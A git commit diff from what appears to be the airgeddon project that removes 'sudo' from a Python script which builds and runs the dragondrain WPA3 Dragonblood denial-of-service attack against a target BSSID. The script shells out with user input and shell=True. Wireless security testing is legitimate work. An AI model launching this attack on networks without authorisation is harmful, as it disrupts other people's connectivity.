74ca52b7365aae00266d5d7846b1472916693c69
OscarAkaElvis <oscar.alfonso.diaz@gmail.com>
2025-06-26 13:47:05 +0200

    Remove sudo (not needed, already executed as root or using sudo when airgeddon is launched)

--- wpa3_dragon_drain_attack.py
+++ wpa3_dragon_drain_attack.py
@@ -10,14 +10,14 @@ FILE_PATH = "/dragondrain/src/dragondrain"
 
 # Define the commands to run if the file does not exist
 INSTALL_COMMANDS = [
-    "sudo apt-get install -y autoconf automake libtool shtool libssl-dev pkg-config",
-    "sudo rm -rf /dragondrain",
-    "sudo git clone https://github.com/vanhoefm/dragondrain-and-time.git /dragondrain",
-    "cd /dragondrain && sudo autoreconf -i", 
-    "cd /dragondrain && sudo ./autogen.sh", 
-    "cd /dragondrain && sudo ./configure",
-    "sudo sed -i '42s/ __packed//' /dragondrain/src/aircrack-osdep/radiotap/radiotap.h",
-    "cd /dragondrain && sudo make"
+    "apt-get install -y autoconf automake libtool shtool libssl-dev pkg-config",
+    "rm -rf /dragondrain",
+    "git clone https://github.com/vanhoefm/dragondrain-and-time.git /dragondrain",
+    "cd /dragondrain && autoreconf -i",
+    "cd /dragondrain && ./autogen.sh",
+    "cd /dragondrain && ./configure",
+    "sed -i '42s/ __packed//' /dragondrain/src/aircrack-osdep/radiotap/radiotap.h",
+    "cd /dragondrain && make"
 ]
 
 def check_and_install():
@@ -28,7 +28,7 @@ def check_and_install():
 
 def run_final_command(bssid, channel, interface):
     # Dynamically generate the FINAL_COMMAND string with user-provided arguments
-    final_command = f"sudo /dragondrain/src/dragondrain -d {interface} -a {bssid} -c {channel} -b 54 -n 20 -r 200"
+    final_command = f"/dragondrain/src/dragondrain -d {interface} -a {bssid} -c {channel} -b 54 -n 20 -r 200"
     
     print(f"Running final command: {final_command}")
     subprocess.run(final_command, shell=True, check=True, input=b"\n")
